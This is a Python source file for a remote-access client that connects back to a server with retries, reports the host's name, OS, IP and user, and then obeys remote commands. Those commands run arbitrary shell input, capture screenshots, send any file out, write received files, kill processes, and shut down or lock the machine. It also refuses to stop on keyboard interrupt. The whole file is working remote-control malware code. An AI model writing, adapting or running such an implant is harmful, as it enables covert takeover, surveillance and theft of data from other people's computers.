import socket
import subprocess
import time
import os
import json
import base64
import platform
import sys

# Auto-install required libraries
def install_package(package, import_name=None):
    import_name = import_name or package
    try:
        __import__(import_name)
    except ImportError:
        print(f"📦 Installing {package}...")
        # Check if Kali/Debian with restricted environment
        if platform.system() == "Linux" and os.path.exists("/usr/bin/apt"):
            try:
                # Try with --break-system-packages for Kali/Debian
                subprocess.check_call([sys.executable, "-m", "pip", "install", "-q", package, "--break-system-packages"])
            except:
                print(f"⚠️ Try manually: sudo apt install python3-{package.lower()}")
        else:
            subprocess.check_call([sys.executable, "-m", "pip", "install", "-q", package])
        print(f"✅ {package} installed")

install_package("Pillow", "PIL")
install_package("mss")

SERVER_IP = "127.0.0.1"
PORT = 5000

current_dir = os.getcwd()
os_name = platform.system()

# OS-specific command mappings
COMMANDS = {
    "Windows": {
        "list_files": "dir",
        "list_processes": "tasklist",
        "network_info": "ipconfig",
        "system_info": "systeminfo",
        "find_process": "tasklist | findstr",
        "kill_process": "taskkill /F /IM",
        "restart": "shutdown /r /t 0",
        "shutdown": "shutdown /s /t 0",
        "lock": "rundll32.exe user32.dll,LockWorkStation",
        "clear": "cls"
    },
    "Linux": {
        "list_files": "ls -la",
        "list_processes": "ps aux",
        "network_info": "ip addr",
        "system_info": "uname -a && lsb_release -a 2>/dev/null || cat /etc/os-release",
        "find_process": "ps aux | grep",
        "kill_process": "killall",
        "restart": "reboot",
        "shutdown": "shutdown -h now",
        "lock": "gnome-screensaver-command -l 2>/dev/null || loginctl lock-session 2>/dev/null || echo 'Lock not supported'",
        "clear": "clear"
    }
}

def get_command(cmd_type):
    """Get OS-specific command"""
    return COMMANDS.get(os_name, COMMANDS["Linux"]).get(cmd_type, cmd_type)

def connect_server():
    """Connect to server with retry"""
    while True:
        try:
            client = socket.socket()
            client.connect((SERVER_IP, PORT))
            print("✓ Connected to server")
            
            # Send client info on connect
            info = {
                "type": "CLIENT_INFO",
                "hostname": platform.node(),
                "os": platform.system(),
                "os_version": platform.version(),
                "ip": socket.gethostbyname(socket.gethostname()),
                "user": os.getlogin()
            }
            client.send(json.dumps(info).encode())
            
            return client
        except:
            print("Connection failed. Retrying in 5 seconds...")
            time.sleep(5)

def take_screenshot():
    """Capture screenshot - cross platform with compression"""
    try:
        from PIL import Image, ImageGrab
        import io
        
        if os_name == "Windows":
            screenshot = ImageGrab.grab()
        else:
            # Linux/Mac using mss or PIL
            try:
                screenshot = ImageGrab.grab()
            except:
                import mss
                import mss.tools
                with mss.mss() as sct:
                    screenshot = sct.grab(sct.monitors[1])
                    screenshot = Image.frombytes("RGB", screenshot.size, screenshot.bgra, "raw", "BGRX")
        
        # Compress and resize for network transfer
        max_size = (1920, 1080)  # Max resolution
        screenshot.thumbnail(max_size, Image.Resampling.LANCZOS)
        
        buffer = io.BytesIO()
        # Use JPEG with compression for smaller size (PNG too large)
        screenshot.save(buffer, format='JPEG', quality=85, optimize=True)
        img_data = base64.b64encode(buffer.getvalue()).decode()
        
        # Check size - if still too large, compress more
        if len(img_data) > 500000:  # ~500KB limit
            buffer = io.BytesIO()
            screenshot.save(buffer, format='JPEG', quality=60, optimize=True)
            img_data = base64.b64encode(buffer.getvalue()).decode()
        
        return json.dumps({
            "type": "SCREENSHOT",
            "status": "success",
            "data": img_data,
            "size": len(img_data),
            "format": "JPEG"
        })
    except ImportError:
        return json.dumps({
            "type": "SCREENSHOT",
            "status": "error",
            "message": "Screenshot library not installed. Run: pip install pillow mss"
        })
    except Exception as e:
        return json.dumps({"type": "SCREENSHOT", "status": "error", "message": str(e)})

def download_file(filepath):
    """Send file to server"""
    try:
        if not os.path.exists(filepath):
            return json.dumps({"type": "DOWNLOAD", "status": "error", "message": "File not found"})
        
        with open(filepath, 'rb') as f:
            file_data = base64.b64encode(f.read()).decode()
        
        return json.dumps({
            "type": "DOWNLOAD",
            "status": "success",
            "filename": os.path.basename(filepath),
            "data": file_data,
            "size": os.path.getsize(filepath)
        })
    except Exception as e:
        return json.dumps({"type": "DOWNLOAD", "status": "error", "message": str(e)})

def upload_file(filename, data_b64):
    """Receive file from server"""
    try:
        file_data = base64.b64decode(data_b64)
        
        filepath = os.path.join(current_dir, filename)
        with open(filepath, 'wb') as f:
            f.write(file_data)
        
        return json.dumps({
            "type": "UPLOAD",
            "status": "success",
            "message": f"File saved: {filepath}",
            "size": len(file_data)
        })
    except Exception as e:
        return json.dumps({"type": "UPLOAD", "status": "error", "message": str(e)})

def main_loop():
    """Main client loop with auto-reconnect - disabled for screenshot failures"""
    global client, current_dir
    screenshot_in_progress = False
    
    while True:
        try:
            client = connect_server()
            current_dir = os.getcwd()
            screenshot_in_progress = False
            
            while True:
                try:
                    data = client.recv(65536)
                    
                    if not data:
                        print("⚠️ Server closed connection")
                        # If screenshot was in progress, don't auto-reconnect
                        if screenshot_in_progress:
                            print("❌ Screenshot failed - connection lost. Exiting...")
                            return
                        break
                    
                    cmd = data.decode(errors='ignore').strip()

                    if cmd.lower() == "exit":
                        print("✓ Exit command received")
                        client.close()
                        return

                    # Special commands
                    if cmd == "SCREENSHOT":
                        screenshot_in_progress = True
                        output = take_screenshot().encode()
                        screenshot_in_progress = False
                    
                    elif cmd.startswith("DOWNLOAD:"):
                        filepath = cmd.split(":", 1)[1].strip()
                        output = download_file(filepath).encode()
                    
                    elif cmd.startswith("UPLOAD:"):
                        try:
                            parts = cmd.split(":", 2)
                            filename = parts[1].strip()
                            data_b64 = parts[2]
                            output = upload_file(filename, data_b64).encode()
                        except Exception as e:
                            output = json.dumps({"type": "UPLOAD", "status": "error", "message": str(e)}).encode()
                    
                    elif cmd == "SYSINFO":
                        info = {
                            "type": "SYSINFO",
                            "hostname": platform.node(),
                            "os": f"{platform.system()} {platform.release()}",
                            "architecture": platform.machine(),
                            "processor": platform.processor(),
                            "user": os.getlogin(),
                            "current_dir": os.getcwd()
                        }
                        output = json.dumps(info, indent=2).encode()
                    
                    elif cmd.strip().startswith("cd"):
                        path = cmd.strip()[2:].strip()
                        try:
                            if path == "":
                                output = f"Directory: {current_dir}".encode()
                            elif path == "..":
                                os.chdir("..")
                                current_dir = os.getcwd()
                                output = f"Directory: {current_dir}".encode()
                            else:
                                os.chdir(path)
                                current_dir = os.getcwd()
                                output = f"Directory: {current_dir}".encode()
                        except Exception as e:
                            output = f"Error: {str(e)}".encode()
                    
                    elif cmd == "NETWORK_INFO":
                        cmd = get_command("network_info")
                        result = subprocess.run(cmd, shell=True, capture_output=True, text=False, cwd=current_dir, timeout=10)
                        output = result.stdout if result.stdout else result.stderr
                    
                    elif cmd == "LIST_FILES":
                        cmd = get_command("list_files")
                        result = subprocess.run(cmd, shell=True, capture_output=True, text=False, cwd=current_dir, timeout=10)
                        output = result.stdout if result.stdout else result.stderr
                    
                    elif cmd == "PROCESSES":
                        cmd = get_command("list_processes")
                        result = subprocess.run(cmd, shell=True, capture_output=True, text=False, cwd=current_dir, timeout=10)
                        output = result.stdout if result.stdout else result.stderr
                    
                    elif cmd == "SYSTEM_INFO":
                        cmd = get_command("system_info")
                        result = subprocess.run(cmd, shell=True, capture_output=True, text=False, cwd=current_dir, timeout=10)
                        output = result.stdout if result.stdout else result.stderr
                    
                    elif cmd == "RESTART":
                        cmd = get_command("restart")
                        result = subprocess.run(cmd, shell=True, capture_output=True, text=False, cwd=current_dir, timeout=5)
                        output = b"Restart command sent"
                    
                    elif cmd == "SHUTDOWN":
                        cmd = get_command("shutdown")
                        result = subprocess.run(cmd, shell=True, capture_output=True, text=False, cwd=current_dir, timeout=5)
                        output = b"Shutdown command sent"
                    
                    elif cmd == "LOCK":
                        cmd = get_command("lock")
                        result = subprocess.run(cmd, shell=True, capture_output=True, text=False, cwd=current_dir, timeout=5)
                        output = b"Lock command sent"
                    
                    elif cmd.startswith("FIND_PROCESS:"):
                        name = cmd.split(":", 1)[1].strip()
                        cmd_str = get_command("find_process") + " " + name
                        result = subprocess.run(cmd_str, shell=True, capture_output=True, text=False, cwd=current_dir, timeout=10)
                        output = result.stdout if result.stdout else result.stderr
                    
                    elif cmd.startswith("KILL_PROCESS:"):
                        name = cmd.split(":", 1)[1].strip()
                        cmd_str = get_command("kill_process") + " " + name
                        result = subprocess.run(cmd_str, shell=True, capture_output=True, text=False, cwd=current_dir, timeout=10)
                        output = result.stdout if result.stdout else result.stderr
                    
                    else:
                        # Command aliases for cross-platform compatibility
                        cmd_lower = cmd.strip().lower()
                        
                        # Linux/Windows command mapping
                        if os_name == "Windows":
                            if cmd_lower == "ls":
                                cmd = "dir"
                            elif cmd_lower.startswith("ls "):
                                cmd = "dir" + cmd[2:]
                            elif cmd_lower == "pwd":
                                cmd = "cd"
                            elif cmd_lower == "clear":
                                cmd = "cls"
                            elif cmd_lower.startswith("cat "):
                                cmd = "type" + cmd[3:]
                            elif cmd_lower.startswith("rm "):
                                cmd = "del" + cmd[2:]
                            elif cmd_lower.startswith("mv "):
                                cmd = "move" + cmd[2:]
                            elif cmd_lower.startswith("cp "):
                                cmd = "copy" + cmd[2:]
                        else:
                            if cmd_lower == "cls":
                                cmd = "clear"
                            elif cmd_lower == "dir":
                                cmd = "ls"
                            elif cmd_lower == "ipconfig":
                                cmd = "ip addr"
                            elif cmd_lower == "tasklist":
                                cmd = "ps aux"
                            elif cmd_lower == "systeminfo":
                                cmd = "uname -a"
                        
                        # Regular command
                        try:
                            result = subprocess.run(
                                cmd,
                                shell=True,
                                capture_output=True,
                                text=False,
                                cwd=current_dir,
                                timeout=10
                            )
                            
                            if result.returncode == 0:
                                if result.stdout and len(result.stdout.strip()) > 0:
                                    output = result.stdout
                                else:
                                    output = f"✓ Command executed successfully: {cmd}".encode()
                            else:
                                if result.stderr and len(result.stderr.strip()) > 0:
                                    output = result.stderr
                                else:
                                    output = f"Command failed with code {result.returncode}".encode()
                                
                        except subprocess.TimeoutExpired:
                            output = "⚠️ Command timeout (10 seconds)".encode()
                        except Exception as e:
                            output = str(e).encode()

                    client.send(output)

                except Exception as e:
                    print(f"⚠️ Connection error: {e}")
                    break
            
            # Connection lost, close and retry
            try:
                client.close()
            except:
                pass
            print("🔄 Reconnecting in 5 seconds...")
            time.sleep(5)
            
        except KeyboardInterrupt:
            print("\n⚠️ Client cannot be stopped manually. Waiting for server to disconnect...")
            continue  # Keep running, don't exit
        except Exception as e:
            print(f"⚠️ Error: {e}")
            print("🔄 Retrying in 5 seconds...")
            time.sleep(5)

if __name__ == "__main__":
    main_loop()
